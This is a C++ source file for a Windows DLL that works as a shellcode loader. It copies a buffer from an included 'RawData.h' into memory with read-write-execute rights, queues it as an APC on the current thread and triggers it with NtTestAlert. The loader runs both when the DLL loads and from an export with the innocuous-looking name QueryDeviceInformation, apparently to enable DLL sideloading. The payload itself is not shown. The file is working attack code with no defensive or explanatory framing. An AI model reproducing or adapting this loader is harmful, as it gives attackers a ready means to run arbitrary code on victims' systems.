#define WIN32_LEAN_AND_MEAN
#include "pch.h"
#include <iostream>
#include <strsafe.h>
#include <TlHelp32.h>
#include <vector>
#include "RawData.h"
#include <Windows.h>
#include <ntstatus.h>
#include <winternl.h>

#pragma comment(lib, "ntdll")

using myNtTestAlert = NTSTATUS(NTAPI*)();


int Launcher(const wchar_t* callingFrom)
{
	myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
    SIZE_T shellSize = sizeof(rawData);
    LPVOID shellAddress = VirtualAlloc(NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(GetCurrentProcess(), shellAddress, rawData, shellSize, NULL);

    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
    testAlert();

    return 0;
};


HRESULT __stdcall QueryDeviceInformation()
{
    Launcher(L"QueryDeviceInformation()");

    return S_OK;
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        Launcher(L"DllMain()");
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}